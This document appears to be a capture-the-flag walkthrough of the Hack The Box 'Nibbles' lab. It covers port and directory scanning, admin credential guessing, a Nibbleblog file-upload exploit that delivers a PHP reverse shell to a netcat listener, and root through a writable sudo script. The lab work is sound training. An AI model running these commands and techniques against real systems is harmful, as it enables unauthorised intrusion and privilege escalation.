# Nibbles [HTB](https://app.hackthebox.com/machines/Nibbles)
![nibbles-01]()

## Recon

After adding the target to my `/etc/hosts` file, i fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- nibbles.htb -oN nmap.result
```

![nmap-res-02]()

We have the following:

+ An SSH server on port 22.
+ An Apache server on port 80.

Lets take a look at the Apache server and see what we can gather. 


### Apache Port 80

If we open the site at `http://nibbles.htb` we get:

![site-03]()

If we take a look at the source code, we can see an interesting comment:

![source-04]()

Lets open this directory at `http://nibbles.htb/nibbleblog`:

![blog-05]()

This is a blog site powered by `Nibbleblog`, all links lead to this home page. Lets take a look at the 
source code once again:

![blog-src-06]()

Looks like we have an `admin` directory, lets see whats inside:

![admin-dir-07]()

As you can see, I've had a look around and i found the following directory `http://nibbles.htb/nibbleblog/admin/templates/easy4/index.bit`: 

![easy4-08]()

If you hover over the `Dashboard` link, youll see it outlines the parameters to get the admin login page: 
`http://nibbles.htb/nibbleblog/admin.php?controller=dashboard`

![admin-login-09]()

Iv'e tried to hunt down the admin password on the site, i couldnt find it. I also tried to search Google
for the default password, but without success as well. So i decided to brute force it. 

I opened `Burp`, capture a login request and send it to `Intruder`. Here i added the password field:

![intruder-10]()

I use a `Sniper` attack with `/usr/share/wordlists/john.list` as the password wordlist:

![setup-11]()

I run the attack and i get Blacklisted after 5 attempts:

![blocked-12]()

So i take a step back and decide to enumerate further with a directory busting scan:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.
txt -u http://nibbles.htb/nibbleblog/FUZZ
``` 

The two most interesting results are:

![ffuf-13]()

![ffuf-14]()


The `content` folder has some interesting `xml` files, like `/private/users.xml`, but it doesnt have the 
admin password. If we take a look at the `README` page:

![readme-15]()

We can see the version of the backend CMS. If we search Google, we can find a [public exploit](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html):

![exploit-16]()

There is also a Metasploit version, but we need the admin credentials. but we cant brute force, so lets try to guess. After a few failed attempts i found the credentials are `admin : nibbles`:

![admin-page-17]()

Now that we know the credentials we can try this file upload [exploit](https://github.com/dix0nym/CVE-2015-6967).  We need a PHP reverse shell, i use [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)'s

Make sure to update your listener's information:

![update-rshell-18]()

Setup the listner with:

```bash
rlwrap nc -lnvp 443
```

Run the exploit with:

```bash
python3 exploit.py --url http://nibbles.htb/nibbleblog/ --username admin --password nibbles --payload rshell.php
```

This should give you access to the system:

![shell-20]()



## Privilege Escalation


If we check our `sudo` privileges with:

```bash
sudo -l
```

![sudo-21]()


We can run a bash script located in our home directory as root. But if `cd` into our user's home directory
we see the following:

![home-dir-22]()

No `personal` directory, instead we have a zip archive. Lets unzip it:

```bash
unzip personal.zip
```
![unzip-23]()


Now if check our user's permissions to this script with `ls -l` we can see:

![perms-23]()

We have full read, write and execute permissions to this script. And since we can run it as root via sudo,
we can edit the file to run whatever command we want with elavated privileges. 

I just start a bash session at the end of the script:

```bash
echo "/bin/bash" >> /personal/stuff/monitor.sh
```

And i execute it with sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

![root-24]()
